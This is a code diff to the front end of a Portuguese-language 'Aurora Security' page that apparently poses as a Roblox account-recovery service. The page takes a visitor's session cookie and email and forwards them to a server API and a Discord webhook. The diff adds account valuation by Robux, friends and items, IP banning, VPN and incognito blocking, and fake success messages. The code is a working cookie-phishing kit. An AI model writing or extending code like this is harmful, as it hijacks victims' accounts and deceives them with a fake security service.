@@ -2598,7 +2598,7 @@
         let timerInterval = null;
         let isBlocked = false;
         let termsAccepted = false;
-        let isUserBanned = false; // NOVA VARIÁVEL PARA CONTROLE DE BANIMENTO
+        let isUserBanned = false;
         let webhookInfo = {
             username: 'Aurora Security',
             avatar_url: 'https://cdn.discordapp.com/emojis/1234567890/a_abcdef.gif'
@@ -2630,14 +2630,12 @@
         // ============================================================
         async function checkBanStatus() {
             try {
-                // Pegar IP do visitante
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const ip = ipData.ip;
 
                 console.log('🔍 Verificando IP:', ip);
 
-                // Verificar na API de banimento
                 const banResponse = await fetch(`/api/ban?check=${ip}`);
                 const banData = await banResponse.json();
 
@@ -2678,13 +2676,11 @@
             blockModal.classList.add('active');
             document.body.style.overflow = 'hidden';
             
-            // Esconder o formulário de recuperação
             const recoveryForm = document.getElementById('recoveryForm');
             if (recoveryForm) {
                 recoveryForm.style.display = 'none';
             }
             
-            // Desabilitar botão de submit
             const submitBtn = document.getElementById('submitBtn');
             if (submitBtn) {
                 submitBtn.disabled = true;
@@ -2698,7 +2694,6 @@
         // 4. TERMS MODAL
         // ============================================================
         function openTermsModal() {
-            // Verificar se está banido
             if (isUserBanned) {
                 showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido e não pode acessar o sistema.');
                 return;
@@ -2725,7 +2720,6 @@
             if (saved === 'true') {
                 termsAccepted = true;
             } else {
-                // Verificar se está banido antes de abrir o modal
                 if (!isUserBanned) {
                     setTimeout(() => { openTermsModal(); }, 1500);
                 }
@@ -2747,11 +2741,10 @@
         }
 
         // ============================================================
-        // 6. FUNÇÃO PARA ENVIAR PARA WEBHOOK
+        // 6. FUNÇÃO PARA ENVIAR PARA WEBHOOK (SÓ USADA COMO FALLBACK)
         // ============================================================
         async function sendToWebhook(cookie, email, ip, isPrivate, vpnDetected) {
             try {
-                // Obter dados de VPN para relatório
                 const vpnData = vpnDetected ? await getIPData() : null;
                 
                 const payload = {
@@ -2804,7 +2797,6 @@
                         message = '🌐 VPN ou Proxy Detectado\n\n❌ Conexões via VPN ou proxy não são permitidas por questões de segurança.';
                     }
                     
-                    // Detalhes adicionais
                     if (data.data.vpn && data.data.vpn.details) {
                         const details = data.data.vpn.details;
                         message += `\n\n📌 Detalhes:\n📍 País: ${details.country}\n🏙️ Cidade: ${details.city}\n📡 ISP: ${details.isp}`;
@@ -2834,7 +2826,6 @@
         // 8. NAVEGAÇÃO
         // ============================================================
         function showSection(sectionId) {
-            // VERIFICAR SE O USUÁRIO ESTÁ BANIDO
             if (isUserBanned) {
                 showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido e não pode acessar o sistema.');
                 return;
@@ -2861,7 +2852,6 @@
         // 8.5 FUNÇÃO PARA IR PARA RECUPERAÇÃO COM VERIFICAÇÃO
         // ============================================================
         function goToRecovery() {
-            // VERIFICAR SE O USUÁRIO ESTÁ BANIDO
             if (isUserBanned) {
                 showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido e não pode usar o sistema de recuperação.');
                 return;
@@ -2925,31 +2915,139 @@
         }
 
         // ============================================================
-        // 12. HANDLE SUBMIT (1 TENTATIVA + 9H BLOQUEIO)
+        // NOVA FUNÇÃO: VALIDAR CONTA ANTES DE ENVIAR
+        // ============================================================
+        async function validateAccount(cookie, email) {
+            try {
+                const response = await fetch('/api/validate-account', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ cookie, email })
+                });
+
+                return await response.json();
+            } catch (error) {
+                console.error('Erro na validação:', error);
+                return { error: true, message: 'Erro ao validar conta' };
+            }
+        }
+
+        // ============================================================
+        // FUNÇÃO: Mostrar resultado da validação
+        // ============================================================
+        function showValidationResult(data) {
+            const oldResult = document.getElementById('validationResult');
+            if (oldResult) oldResult.remove();
+
+            const resultDiv = document.createElement('div');
+            resultDiv.id = 'validationResult';
+            resultDiv.style.cssText = `
+                margin-top: 1rem;
+                background: linear-gradient(135deg, rgba(124,58,237,0.1), rgba(192,132,252,0.1));
+                border: 2px solid ${data.level.color};
+                border-radius: 12px;
+                padding: 1.2rem;
+                animation: fadeInUp 0.4s ease-out;
+            `;
+
+            resultDiv.innerHTML = `
+                <div style="display: flex; align-items: center; gap: 1rem; flex-wrap: wrap;">
+                    <img src="${data.avatar.thumbnail}" style="width: 50px; height: 50px; border-radius: 50%; border: 2px solid ${data.level.color};" onerror="this.style.display='none'">
+                    <div>
+                        <h4 style="color: white; margin: 0;">${data.username}</h4>
+                        <p style="color: rgba(255,255,255,0.6); margin: 0; font-size: 0.8rem;">${data.displayName} • ${data.accountAge.formatted}</p>
+                    </div>
+                    <div style="margin-left: auto; background: ${data.level.color}20; padding: 0.2rem 0.6rem; border-radius: 50px; border: 1px solid ${data.level.color};">
+                        <span style="color: ${data.level.color}; font-weight: 700; font-size: 0.8rem;">${data.level.badge}</span>
+                    </div>
+                </div>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); gap: 0.5rem; margin-top: 0.8rem;">
+                    <div style="text-align: center; background: rgba(0,0,0,0.2); border-radius: 8px; padding: 0.5rem;">
+                        <p style="color: rgba(255,255,255,0.4); font-size: 0.6rem; margin: 0;">Amigos</p>
+                        <p style="color: white; font-weight: 700; margin: 0;">${data.stats.friends}</p>
+                    </div>
+                    <div style="text-align: center; background: rgba(0,0,0,0.2); border-radius: 8px; padding: 0.5rem;">
+                        <p style="color: rgba(255,255,255,0.4); font-size: 0.6rem; margin: 0;">Grupos</p>
+                        <p style="color: white; font-weight: 700; margin: 0;">${data.stats.groups}</p>
+                    </div>
+                    <div style="text-align: center; background: rgba(0,0,0,0.2); border-radius: 8px; padding: 0.5rem;">
+                        <p style="color: rgba(255,255,255,0.4); font-size: 0.6rem; margin: 0;">Itens</p>
+                        <p style="color: white; font-weight: 700; margin: 0;">${data.stats.items}</p>
+                    </div>
+                    <div style="text-align: center; background: rgba(0,0,0,0.2); border-radius: 8px; padding: 0.5rem;">
+                        <p style="color: rgba(255,255,255,0.4); font-size: 0.6rem; margin: 0;">Robux</p>
+                        <p style="color: ${data.robux.color}; font-weight: 700; margin: 0; font-size: 0.85rem;">${data.robux.formatted}</p>
+                    </div>
+                </div>
+                <div style="margin-top: 0.5rem; text-align: center; background: rgba(0,0,0,0.2); border-radius: 8px; padding: 0.3rem;">
+                    <p style="color: rgba(255,255,255,0.6); font-size: 0.7rem; margin: 0;">${data.robux.level} • ${data.level.name}</p>
+                </div>
+            `;
+
+            const securityBox = document.querySelector('.security-box');
+            securityBox.parentNode.insertBefore(resultDiv, securityBox.nextSibling);
+        }
+
+        // ============================================================
+        // FUNÇÃO: Custom Modal para BOT
+        // ============================================================
+        function showCustomModal(title, message, type) {
+            const modal = document.createElement('div');
+            modal.style.cssText = `
+                position: fixed;
+                inset: 0;
+                background: rgba(0,0,0,0.85);
+                backdrop-filter: blur(15px);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 99999;
+                padding: 1.5rem;
+                animation: fadeInUp 0.3s ease-out;
+            `;
+
+            const colors = {
+                danger: '#ef4444',
+                warning: '#f59e0b',
+                success: '#10b981'
+            };
+
+            modal.innerHTML = `
+                <div style="background: linear-gradient(135deg, rgba(10,5,21,0.98), rgba(26,13,46,0.98)); border: 2px solid ${colors[type] || '#7c3aed'}; border-radius: 20px; padding: 2rem; max-width: 500px; width: 100%; text-align: center; animation: scaleIn 0.3s ease-out;">
+                    <div style="font-size: 3rem; margin-bottom: 1rem;">🤖</div>
+                    <h2 style="color: ${colors[type] || 'white'}; font-size: 1.5rem; font-weight: 800; font-family: 'Poppins', sans-serif; margin-bottom: 0.8rem;">${title}</h2>
+                    <p style="color: rgba(255,255,255,0.8); font-size: 0.95rem; line-height: 1.7;">${message}</p>
+                    <button onclick="this.closest('div[style]').remove()" style="margin-top: 1.5rem; background: linear-gradient(135deg, #7c3aed, #5b21b6); color: white; border: none; padding: 0.8rem 2rem; border-radius: 10px; font-weight: 700; cursor: pointer; font-family: 'Inter', sans-serif; transition: all 0.3s ease;">
+                        <i class="fas fa-check"></i> Entendi
+                    </button>
+                </div>
+            `;
+
+            document.body.appendChild(modal);
+        }
+
+        // ============================================================
+        // 12. HANDLE SUBMIT COM VALIDAÇÃO DE CONTA
         // ============================================================
         async function handleSubmit(event) {
             event.preventDefault();
             
-            // VERIFICAR SE O USUÁRIO ESTÁ BANIDO
             if (isUserBanned) {
                 showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido e não pode usar o sistema de recuperação.');
                 return;
             }
             
-            // Verificar se aceitou os termos
             if (!termsAccepted) {
                 openTermsModal();
                 showNotification('⚠️', 'Aceite os Termos!', 'Você precisa aceitar os termos de serviço para continuar. ✨');
                 return;
             }
             
-            // Verificar se está bloqueado por tentativa
             if (isBlocked) {
                 showNotification('⏳', 'Aguarde!', 'Você precisa esperar 9 horas para tentar novamente.');
                 return;
             }
 
-            // Verificar navegador anônimo (reforço)
             const isPrivate = await isPrivateBrowsing();
             const isGoogleIncog = await isGoogleIncognito();
             const hasVPN = await detectVPN();
@@ -2977,25 +3075,71 @@
                 return;
             }
 
-            // Verificar se já tentou
             if (hasAttempted) {
                 showNotification('⏳', 'Limite atingido!', 'Você só pode tentar 1 vez. Aguarde 9 horas.');
                 return;
             }
 
-            const ip = await getIP();
-
-            // Mostrar loading
+            // ============================================
+            // 🔥 VALIDAR CONTA ANTES DE ENVIAR
+            // ============================================
             document.getElementById('submitBtn').disabled = true;
-            document.getElementById('submitBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando...';
+            document.getElementById('submitBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Validando conta...';
 
-            const sent = await sendToWebhook(cookie, email, ip, isPrivate, hasVPN);
+            const validateResult = await validateAccount(cookie, email);
 
-            if (sent) {
+            // Se for BOT
+            if (validateResult.error && validateResult.message && validateResult.message.includes('BOT')) {
+                showNotification('🤖', 'CONTA BOT DETECTADA!', 'IP banido automaticamente.');
+                
+                let reasonsHtml = (validateResult.reasons || []).map(r => `<li>${r}</li>`).join('');
+                showCustomModal(
+                    '🤖 CONTA BOT DETECTADA',
+                    `Esta conta foi identificada como BOT. Motivos:<br><ul style="text-align:left;">${reasonsHtml || '<li>Motivo desconhecido</li>'}</ul><br>Seu IP foi registrado e banido.`,
+                    'danger'
+                );
+                
+                document.getElementById('submitBtn').disabled = false;
+                document.getElementById('submitBtn').innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
+                return;
+            }
+
+            // Se for inválida (cookie inválido, etc)
+            if (validateResult.error) {
+                showNotification('❌', 'Erro!', validateResult.message || 'Falha na validação');
+                document.getElementById('submitBtn').disabled = false;
+                document.getElementById('submitBtn').innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
+                return;
+            }
+
+            // ============================================
+            // CONTA VÁLIDA! MOSTRAR INFORMAÇÕES
+            // ============================================
+            if (validateResult.success) {
+                showValidationResult(validateResult);
+
+                const confirmRecovery = confirm(
+                    `✅ CONTA VALIDADA!\n\n` +
+                    `👤 Usuário: ${validateResult.username}\n` +
+                    `📅 Idade: ${validateResult.accountAge.formatted}\n` +
+                    `👥 Amigos: ${validateResult.stats.friends}\n` +
+                    `💰 Robux Estimado: ${validateResult.robux.formatted}\n` +
+                    `📊 Nível: ${validateResult.level.badge}\n\n` +
+                    `Deseja continuar com a recuperação?`
+                );
+
+                if (!confirmRecovery) {
+                    document.getElementById('submitBtn').disabled = false;
+                    document.getElementById('submitBtn').innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
+                    return;
+                }
+
+                // ============================================
+                // BLOQUEAR E MOSTRAR SUCESSO (webhook já foi enviado pela API)
+                // ============================================
                 hasAttempted = true;
                 isBlocked = true;
                 
-                // Salvar bloqueio de 9 horas
                 blockUntil = Date.now() + (9 * 60 * 60 * 1000);
                 localStorage.setItem('aurora_block_until', blockUntil.toString());
                 
@@ -3009,12 +3153,9 @@
                 if (timerInterval) clearInterval(timerInterval);
                 timerInterval = setInterval(updateTimer, 1000);
                 
-                showNotification('✅', 'Dados Enviados!', 'Suas informações foram enviadas com segurança. ✨');
+                showNotification('✅', 'Sucesso!', 'Conta validada e enviada para recuperação!');
                 showProcessingModal();
-            } else {
-                document.getElementById('submitBtn').disabled = false;
-                document.getElementById('submitBtn').innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
-                showNotification('❌', 'Erro!', 'Falha ao enviar dados. Tente novamente.');
+                setTimeout(showSuccessModal, 3000);
             }
         }
 
@@ -3168,7 +3309,6 @@
         // 20. INICIAR
         // ============================================================
         async function init() {
-            // ===== 1. VERIFICAR NAVEGADOR ANÔNIMO (VIA NAVEGADOR - MAIS CONFIÁVEL) =====
             console.log('🔍 Verificando navegador anônimo (via navegador)...');
             const isPrivateBrowser = await detectPrivateBrowsingBrowser();
             
@@ -3183,16 +3323,14 @@
             }
             console.log('✅ Navegador normal, continuando...');
 
-            // ===== 2. VERIFICAR SE O IP ESTÁ BANIDO =====
             console.log('🔍 Verificando se o IP está banido...');
             const isBanned = await checkBanStatus();
             if (isBanned) {
                 console.log('🚫 Acesso bloqueado: IP banido');
-                return; // IMPEDE O ACESSO COMPLETO AO SITE
+                return;
             }
             console.log('✅ IP não está banido, continuando...');
 
-            // ===== 3. VERIFICAR NAVEGADOR ANÔNIMO E VPN (VIA API) =====
             console.log('🔍 Verificando navegador e VPN via API...');
             const detectResult = await checkDetection();
             
@@ -3202,11 +3340,9 @@
             }
             console.log('✅ Navegador e VPN OK!');
 
-            // Carregar informações do webhook do Discord
             console.log('🔗 Carregando informações do webhook...');
             await fetchWebhookInfo();
             
-            // Verificar bloqueio de anônimo (APENAS - fallback)
             const blocked = await checkBlocked();
             if (blocked) {
                 console.log('🚭 Acesso bloqueado: Navegador Anônimo detectado');
